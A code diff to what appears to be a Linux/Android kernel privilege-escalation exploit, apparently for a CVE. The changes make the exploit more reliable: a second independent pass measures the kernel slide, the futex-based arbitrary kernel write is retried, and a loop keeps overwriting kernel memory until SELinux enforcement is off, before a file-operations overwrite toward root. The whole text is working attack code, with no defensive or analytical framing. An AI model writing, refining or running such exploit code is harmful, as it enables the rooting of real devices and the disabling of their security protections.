@@ -37,6 +37,23 @@
 #define SU_SOCKET_ENV "CVE43499_SU_SOCKET"
 #define SU_SOCKET_PATH_OFF 0x200
 #define RECLAIM_ATTEMPT_TIMEOUT_MS 120000
+#define Q0_WRITE_ATTEMPTS 4
+#define Q0_WRITE_ATTEMPT_DELAY_MS 300
+
+static int selinux_disabled(void) {
+  static char enforce_path[] = "/sys/fs/selinux/enforce";
+  FILE *stream;
+  char value[8] = {0};
+  int disabled = 0;
+
+  stream = fopen(enforce_path, "r");
+  if (!stream)
+    return 0;
+  if (fgets(value, sizeof(value), stream))
+    disabled = value[0] == '0';
+  fclose(stream);
+  return disabled;
+}
 
 struct umh_subprocess_info {
   unsigned char work[48];
@@ -829,60 +846,153 @@ static _Noreturn void hold_reclaimed_page(uint64_t slide) {
   hold_page_common(target, base, slide);
 }
 
-static uint64_t find_slide(void) {
-  uint64_t slide = a536_find_slide();
-
-  if (slide > MAX_PHYSICAL_SLIDE || (slide & (PHYSICAL_SLIDE_ALIGNMENT - 1))) {
-    errno = EPROTO;
-    die("prefetch slide");
-  }
-  printf("SLIDE_PREFETCH value=%#llx\n", (unsigned long long)slide);
-  fflush(stdout);
-  return slide;
-}
-
-static pid_t run_q0_write_stage(uint64_t slide, uint64_t target, uint64_t value,
-                                uint64_t lock, const char *label) {
+static uint64_t slide_second_pass(void) {
   int pair[2];
-  int ready = 0;
-  pid_t child;
   FILE *stream;
+  pid_t child;
+  uint64_t value = UINT64_MAX;
   char line[512];
+  int status;
 
   if (pipe2(pair, O_CLOEXEC))
-    die("pipe q0");
+    die("pipe slide recheck");
   child = fork();
   if (child < 0)
-    die("fork q0");
+    die("fork slide recheck");
   if (!child) {
+    uint64_t measured;
+
     if (dup2(pair[1], STDERR_FILENO) < 0)
       _exit(126);
     close(pair[0]);
     close(pair[1]);
-    a536_write64(slide, target, value, lock);
+    measured = a536_find_slide();
+    dprintf(STDERR_FILENO, "SLIDE#%#llx\n", (unsigned long long)measured);
+    _exit(0);
   }
   close(pair[1]);
   stream = fdopen(pair[0], "r");
   if (!stream)
-    die("fdopen q0");
+    die("fdopen slide recheck");
   while (fgets(line, sizeof(line), stream)) {
-    printf("%s: %s", label, line);
-    fflush(stdout);
-    if (!strncmp(line, "consume done;", 13)) {
-      ready = 1;
+    unsigned long long parsed;
+
+    if (!strncmp(line, "SLIDE#", 6)) {
+      if (sscanf(line + 6, "%llx", &parsed) != 1)
+        value = UINT64_MAX;
+      else
+        value = (uint64_t)parsed;
       break;
-    }
-    if (!strncmp(line, "FAIL", 4)) {
-      errno = EPROTO;
-      die("q0 write");
     }
   }
   fclose(stream);
-  if (!ready) {
+  do {
+    if (waitpid(child, &status, 0) < 0) {
+      if (errno == EINTR)
+        continue;
+      break;
+    }
+    break;
+  } while (1);
+  return value;
+}
+
+static uint64_t find_slide(void) {
+  uint64_t first;
+  uint64_t second;
+
+  /*
+   * The q0 write dereferences image bases plus the prefetch-measured slide;
+   * a misdetected edge would put the first kernel write at a wrong address
+   * and panic the device.  Re-measure the slide in a fresh process and only
+   * proceed when the two independent passes agree, so a bad read costs a
+   * clean abort instead of a reboot.
+   */
+  first = a536_find_slide();
+  printf("SLIDE_PREFETCH value=%#llx\n", (unsigned long long)first);
+  fflush(stdout);
+  second = slide_second_pass();
+  if (first != second) {
+    fprintf(stderr,
+            "SLIDE_MISMATCH first=%#llx second=%#llx; aborting before any "
+            "write\n",
+            (unsigned long long)first, (unsigned long long)second);
+    fflush(stderr);
     errno = EPROTO;
-    die("q0 ended");
+    die("slide verification");
   }
-  return child;
+  if (first > MAX_PHYSICAL_SLIDE || (first & (PHYSICAL_SLIDE_ALIGNMENT - 1))) {
+    errno = EPROTO;
+    die("prefetch slide");
+  }
+  return first;
+}
+
+static pid_t run_q0_write_stage(uint64_t slide, uint64_t target, uint64_t value,
+                                uint64_t lock, const char *label) {
+  pid_t child = -1;
+  int attempt;
+
+  /*
+   * a536_write64 reports requeue EDEADLK (errno 35) on the intended deadlock
+   * graph and still completes the stamp, so "consume done" is the success
+   * signal even when the requeue returned -35.  Only hard failures (thread
+   * creation, futex lock errors) print FAIL; those are retried in a fresh
+   * process, up to Q0_WRITE_ATTEMPTS, before the stage is given up.
+   */
+  for (attempt = 0; attempt < Q0_WRITE_ATTEMPTS; ++attempt) {
+    int pair[2];
+    int ready = 0;
+    FILE *stream;
+    char line[512];
+
+    if (pipe2(pair, O_CLOEXEC))
+      die("pipe q0");
+    child = fork();
+    if (child < 0)
+      die("fork q0");
+    if (!child) {
+      if (dup2(pair[1], STDERR_FILENO) < 0)
+        _exit(126);
+      close(pair[0]);
+      close(pair[1]);
+      a536_write64(slide, target, value, lock);
+    }
+    close(pair[1]);
+    stream = fdopen(pair[0], "r");
+    if (!stream)
+      die("fdopen q0");
+    while (fgets(line, sizeof(line), stream)) {
+      printf("%s: %s", label, line);
+      fflush(stdout);
+      if (!strncmp(line, "consume done;", 13)) {
+        ready = 1;
+        break;
+      }
+      if (!strncmp(line, "FAIL", 4)) {
+        fprintf(stderr, "%s: attempt %d FAIL: %s", label, attempt, line);
+        fflush(stderr);
+        break;
+      }
+    }
+    fclose(stream);
+    if (ready)
+      return child;
+    {
+      int status;
+      pid_t waited;
+
+      if (kill(child, SIGTERM) && errno != ESRCH)
+        die("terminate q0 attempt");
+      do {
+        waited = waitpid(child, &status, 0);
+      } while (waited < 0 && errno == EINTR);
+      child = -1;
+      usleep(Q0_WRITE_ATTEMPT_DELAY_MS * 1000);
+    }
+  }
+  errno = EPROTO;
+  die("q0 write");
 }
 
 static _Noreturn void run_chain(uint64_t slide) {
@@ -937,8 +1047,29 @@ static _Noreturn void run_chain(uint64_t slide) {
     }
   }
 
-  selinux_pid = run_q0_write_stage(slide, SELINUX_STATE_ALIAS + slide, 0,
-                                   lock + KS_SELINUX_LOCK_OFF, "selinux");
+  selinux_pid = -1;
+  for (int attempt = 0; attempt < Q0_WRITE_ATTEMPTS; ++attempt) {
+    if (attempt)
+      usleep(Q0_WRITE_ATTEMPT_DELAY_MS * 1000);
+    selinux_pid = run_q0_write_stage(slide, SELINUX_STATE_ALIAS + slide, 0,
+                                     lock + KS_SELINUX_LOCK_OFF, "selinux");
+    if (selinux_disabled()) {
+      printf("selinux: disabled enforce (attempt %d)\n", attempt);
+      fflush(stdout);
+      break;
+    }
+    fprintf(stderr,
+            "selinux: enforce still on after attempt %d, retrying "
+            "(result=%#llx)\n",
+            attempt, (unsigned long long)(SELINUX_STATE_ALIAS + slide));
+    fflush(stderr);
+    terminate_child(selinux_pid, "terminate selinux retry");
+    selinux_pid = -1;
+  }
+  if (selinux_pid < 0) {
+    errno = EPROTO;
+    die("selinux disable");
+  }
   write_pid = run_q0_write_stage(slide, target, fops, lock, "fops-write");
   owner_pid = run_q0_write_stage(slide, fops, 0, lock + KS_OWNER_LOCK_OFF,
                                  "fops-owner");
